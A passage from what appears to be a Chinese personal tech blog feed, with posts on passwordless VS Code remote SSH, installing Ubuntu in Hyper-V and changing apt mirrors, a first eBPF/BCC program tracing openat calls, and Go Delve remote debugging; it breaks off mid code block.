title="4.新建窗口连接"></a>4.新建窗口连接</h3><p>此时，单击“新建连接”按钮，vscode会重新打开一个窗口，提示输入远程服务器的密码。<br><img src="https://img-blog.csdnimg.cn/9759c53f6ac440c5b8849dd5907d0b11.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fa51d90355ce49f19f5c46ff09d3ab71.png" alt="在这里插入图片描述"></p><h2 id="2-进阶版-免密"><a href="#2-进阶版-免密" class="headerlink" title="2. 进阶版-免密"></a>2. 进阶版-免密</h2><p>上面的方式每次连接主机都需要输入密码，为了简化操作，使用公钥进行免密登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux服务器：<br>[root@<span class="hljs-built_in">test</span> ~]$ <span class="hljs-built_in">mkdir</span> .ssh<br>[root@<span class="hljs-built_in">test</span> ~]$ <span class="hljs-built_in">cd</span> .ssh<br>[root@<span class="hljs-built_in">test</span> .ssh]$ vi authorized_keys<br><span class="hljs-comment">#此处输入windows的.../.ssh/id_rsa.pub内容</span><br>[root@<span class="hljs-built_in">test</span> .ssh]$ <span class="hljs-built_in">chmod</span> 600 authorized_keys<br><br>windows下的vscode：<br>直接点击新建窗口，即可成功免密跳转！<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】hyperv创建ubuntu20.10虚拟机</title>
    <link href="/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91hyperv%E5%88%9B%E5%BB%BAubuntu20.10%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91hyperv%E5%88%9B%E5%BB%BAubuntu20.10%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><font color=red>下面以20.10为例： (18.04在后面，只做了部分修改)</font></p><h2 id="准备工作-镜像下载"><a href="#准备工作-镜像下载" class="headerlink" title="准备工作 镜像下载"></a>准备工作 镜像下载</h2><p><a href="https://old-releases.ubuntu.com/releases/20.10/">Ubuntu 20.10 (Groovy Gorilla)</a></p><h2 id="操作步骤-成功创建"><a href="#操作步骤-成功创建" class="headerlink" title="操作步骤(成功创建)"></a>操作步骤(成功创建)</h2><p>开始-&gt;设置-&gt;应用-&gt;程序和功能-&gt;启用或关闭Windows功能。<br>在打开的窗口中，选择“Hyper-V”</p><p>新建虚拟机，流程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165812170.png" alt="image-20220725165812170"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165856177.png" alt="image-20220725165856177"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165936840.png" alt="image-20220725165936840"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170507477.png" alt="image-20220725170507477"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170541316.png" alt="image-20220725170541316"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170629907.png" alt="image-20220725170629907"></p><p>这一块不敢点呀不敢点，就害怕把自己windows的硬盘格式化了</p><p>从网上查了好多，都说没事的</p><p>终于顶着一颗悬着的心点了下去</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170709688.png" alt="image-20220725170709688"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725171844768.png" alt="image-20220725171844768"></p><p>可以输入“Shanghai”</p><p>也可以点击地图中的位置</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725172016759.png" alt="image-20220725172016759"></p><p>点击“ restart”</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725172923147.png" alt="image-20220725172923147"></p><p>点击“enter”</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725173115871.png" alt="image-20220725173115871"></p><p>这个真的是吓死我了</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>默认显示如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725174238658.png" alt="image-20220725174238658"></p><h3 id="调整虚拟机的分辨率与性能"><a href="#调整虚拟机的分辨率与性能" class="headerlink" title="调整虚拟机的分辨率与性能"></a>调整虚拟机的分辨率与性能</h3><p>默认情况下，Hyper-V下的 Ubuntu 桌面的分辨不够理想，需要我们手动调整，请在 Ubuntu 桌面上右键，在菜单中选择 “Open in Terminal”， 在打开的Terminal终端窗口中输入以下指令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo gedit <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub<br></code></pre></td></tr></table></figure><p>此时，系统会打开一个文本编辑器，请在当前文件中寻找到 GRUB_CMDLINE_LINUX_DEFAULT 所在行，在最后加上 video&#x3D;hyperv_fb:[1920x1080]，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725174647281.png" alt="image-20220725174647281"></p><p>保存上述文件后退出文本编辑器，在 Terminal 终端窗口中输入以下指令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-grub</span><br></code></pre></td></tr></table></figure><p>最后，请重新启动 Ubuntu 虚拟机，重新登录后的 Ubuntu 桌面，其分辨率将设置为您刚才指定的大小。</p><h2 id="创建失败"><a href="#创建失败" class="headerlink" title="创建失败"></a>创建失败</h2><h3 id="失败例子1"><a href="#失败例子1" class="headerlink" title="失败例子1"></a>失败例子1</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725135724492.png" alt="image-20220725135724492"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725133331911.png" alt="image-20220725133331911"></p><h3 id="失败例子2"><a href="#失败例子2" class="headerlink" title="失败例子2"></a>失败例子2</h3><p>选择第二代</p><p>安全启动那块选了微软的那个选项</p><p>也报错了，没有成功</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725133331911.png" alt="image-20220725133331911"></p><h2 id="hyper操作"><a href="#hyper操作" class="headerlink" title="hyper操作"></a>hyper操作</h2><h3 id="从-Hyper-V-管理器重启服务"><a href="#从-Hyper-V-管理器重启服务" class="headerlink" title="从 Hyper-V 管理器重启服务"></a>从 Hyper-V 管理器重启服务</h3><ol><li>打开 Hyper-V 管理器。 单击<strong>“开始”</strong>，指向<strong>“管理工具”</strong>，然后单击<strong>“Hyper-V 管理器”</strong>。</li><li>在导航窗格中，单击服务器的名称（如果尚未选择）。</li><li>在” <strong>操作”窗格中</strong> ，单击” **启动服务”**。</li></ol><h2 id="ubuntu20-10更换源"><a href="#ubuntu20-10更换源" class="headerlink" title="ubuntu20.10更换源"></a>ubuntu20.10更换源</h2><p>Ubuntu 的软件源配置文件是 &#x2F;etc&#x2F;apt&#x2F;sources.list。将系统自带的该文件做个备份，将该文件替换为下面内容，即可使用国内的软件源镜像。<br>一定要备份，一定要备份，一定要备份，重要的事情说三遍。</p><p>1.备份原始源文件source.list<br>sudo  cp   &#x2F;etc&#x2F;apt&#x2F;sources.list   &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</p><p>2.修改源文件sources.list</p><p>删除原来的文件内容，复制下面的官方源到其中并保存</p><p> <a href="https://mirrors.ustc.edu.cn/repogen/">中科大官网</a></p><p>下面是中科大 ubuntu20.10的源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-security main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-security main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-updates main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-updates main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-backports main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-backports main restricted universe multiverse<br><br><span class="hljs-comment">## Not recommended</span><br><span class="hljs-comment"># deb https://mirrors.ustc.edu.cn/ubuntu-old-releases/ubuntu/ groovy-proposed main restricted universe multiverse</span><br><span class="hljs-comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu-old-releases/ubuntu/ groovy-proposed main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><p>3.更新源<br>桌面终端执行命令：sudo apt update更新软件列表，换源完成。</p><h1 id="—————–-2022-08-14-—————–"><a href="#—————–-2022-08-14-—————–" class="headerlink" title="—————– 2022.08.14 —————–"></a>—————– 2022.08.14 —————–</h1><h2 id="ubuntu18-04-6"><a href="#ubuntu18-04-6" class="headerlink" title="ubuntu18.04.6"></a>ubuntu18.04.6</h2><p><a href="https://releases.ubuntu.com/18.04.6/">ubuntu18.04.6镜像下载</a></p><h3 id="成功尝试"><a href="#成功尝试" class="headerlink" title="成功尝试"></a>成功尝试</h3><p>指定代数：第一代</p><p>启用安全启动：去掉或者不去掉都可以成功</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814214057058.png" alt="image-20220814214057058"></p><p>更换源： 18.04 阿里</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-security main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-security main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse<br><br><span class="hljs-comment"># deb https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="hljs-comment"># deb-src https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse<br><br></code></pre></td></tr></table></figure><h3 id="失败尝试"><a href="#失败尝试" class="headerlink" title="失败尝试"></a>失败尝试</h3><p>指定代数：第二代</p><p>启用安全启动：去掉</p><p>报错信息：unable to find a medium containing a live file system</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/fedragon/article/details/117300451">win10 Hyper-V安装配置ubuntu虚拟机</a> 重要 参考”操作步骤“</p><p><a href="https://www.szdamai.com/help/app/ubuntuhyperv">在 Hyper-V 中安装 Ubuntu 系统</a> 次重要 参考”更改分辨率“</p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/virtualization/hyper-v/best-practices-analyzer/the-hyper-v-virtual-machine-management-service-must-be-running">Hyper-V 虚拟机管理服务必须正在运行</a></p><p><a href="https://blog.csdn.net/weixin_44302833/article/details/110132032">Ubuntu 20.10 groovy 更换国内源</a></p><p><a href="https://cloud.tencent.com/developer/article/1434564">修改Ubuntu操作系统root默认密码</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】first try</title>
    <link href="/2022/07/25/ebpf/%E3%80%90ebpf%E3%80%91first%20try/"/>
    <url>/2022/07/25/ebpf/%E3%80%90ebpf%E3%80%91first%20try/</url>
    
    <content type="html"><![CDATA[<h1 id="03-初窥门径：开发并运行你的第一个-eBPF-程序"><a href="#03-初窥门径：开发并运行你的第一个-eBPF-程序" class="headerlink" title="03 | 初窥门径：开发并运行你的第一个 eBPF 程序"></a>03 | 初窥门径：开发并运行你的第一个 eBPF 程序</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.13.0-51-generic <span class="hljs-comment">#58~20.04.1-Ubuntu SMP Tue Jun 14 11:29:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ningan ebpf]<span class="hljs-comment"># sudo apt-get install -y  make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br>Reading package lists... Done<br>Building dependency tree<br>Reading state information... Done<br>linux-headers-5.8.0-25-generic is already the newest version (5.8.0-25.26).<br>linux-tools-5.8.0-25-generic is already the newest version (5.8.0-25.26).<br>make is already the newest version (4.3-4ubuntu1).<br>bpfcc-tools is already the newest version (0.12.0-2).<br>clang is already the newest version (1:11.0-51~exp1).<br>libbpf-dev is already the newest version (1:0.1.0-1).<br>libbpfcc-dev is already the newest version (0.12.0-2).<br>llvm is already the newest version (1:11.0-51~exp1).<br>libelf-dev is already the newest version (0.181-1ubuntu0.1).<br>0 upgraded, 0 newly installed, 0 to remove and 147 not upgraded.<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726130910879.png" alt="image-20220726130910879"></p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h3 id="开发第一个-eBPF-程序"><a href="#开发第一个-eBPF-程序" class="headerlink" title="开发第一个 eBPF 程序"></a>开发第一个 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat hello.c</span><br><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br><br><br><br>[root@ningan ebpf]<span class="hljs-comment"># cat hello.py</span><br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># 导入了 BCC  库的 BPF 模块，以便接下来调用；</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># 调用 BPF() 加载第一步开发的 BPF 源代码；</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># 将 BPF 程序挂载到内核探针（简称 kprobe），其中 do_sys_openat2() 是系统调用 openat() 在内核中的实现；</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># 读取内核调试文件 /sys/kernel/debug/tracing/trace_pipe 的内容，并打印到标准输出中。</span><br>b.trace_print()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726132704120.png" alt="image-20220726132704120"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat /sys/kernel/debug/tracing/trace_options</span><br>print-parent<br>nosym-offset<br>nosym-addr<br>noverbose<br>noraw<br>nohex<br>nobin<br>noblock<br>trace_printk<br>annotate<br>nouserstacktrace<br>nosym-userobj<br>noprintk-msg-only<br>context-info<br>nolatency-format<br>record-cmd<br>norecord-tgid<br>overwrite<br>nodisable_on_free<br>irq-info<br>markers<br>noevent-fork<br>nopause-on-trace<br>function-trace<br>nofunction-fork<br>nodisplay-graph<br>nostacktrace<br>notest_nop_accept<br>notest_nop_refuse<br><br></code></pre></td></tr></table></figure><h3 id="改进第一个-eBPF-程序"><a href="#改进第一个-eBPF-程序" class="headerlink" title="改进第一个 eBPF 程序"></a>改进第一个 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat trace-open.c</span><br><br>// 包含头文件<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// 定义数据结构<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// 定义性能事件映射<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// 定义kprobe处理函数<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // 获取PID和时间<br>  data.pid = bpf_get_current_pid_tgid();<br>  data.ts = bpf_ktime_get_ns();<br><br>  // 获取进程名<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename);<br>  &#125;<br><br>  // 提交性能事件<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br><br><br><br><br><br>[root@ningan ebpf]<span class="hljs-comment"># cat trace-open.py</span><br><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># 加载 eBPF 程序并挂载到内核探针上</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># 输出一行 Header 字符串表示数据的格式</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event 定义一个数据处理的回调函数，打印进程的名字、PID 以及它调用 openat 时打开的文件</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer 定义了名为 “events” 的 Perf 事件映射，而后通过一个循环调用 perf_buffer_poll 读取映射的内容，并执行回调函数输出进程信息</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726133833600.png" alt="image-20220726133833600"></p><p>大功告成！</p>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】vscode远程调试</title>
    <link href="/2022/07/23/software/%E3%80%90vscode%E3%80%91vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <url>/2022/07/23/software/%E3%80%90vscode%E3%80%91vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h3 id="使用Delve调试时将参数传递给可执行文件"><a href="#使用Delve调试时将参数传递给可执行文件" class="headerlink" title="使用Delve调试时将参数传递给可执行文件"></a>使用Delve调试时将参数传递给可执行文件</h3><p>在有main.go的地方执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=arm64 go build  <span class="hljs-attribute">-gcflags</span>=<span class="hljs-string">&quot;all=-N -l&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">go build -gcflags<span class="hljs-operator">=</span><span class="hljs-string">&quot;all=-N -l&quot;</span><br></code></pre></td></tr></table></figure><p>会生成二进制文件</p><p>Add <code>--</code> to tell <code>dlv</code> that all subsequent arguments should be passed verbatim to the binary, without trying to parse them:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dlv <span class="hljs-attribute">--listen</span>=:5432 exec /mypath/binary -- <span class="hljs-attribute">--config</span>=config.toml<br></code></pre></td></tr></table></figure><h2 id="2023-02-13-下载编译更新dlv"><a href="#2023-02-13-下载编译更新dlv" class="headerlink" title="2023.02.13 下载编译更新dlv"></a>2023.02.13 下载编译更新dlv</h2><p>github地址：<a href="https://github.com/go-delve/delve/releases">https://github.com/go-delve/delve/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 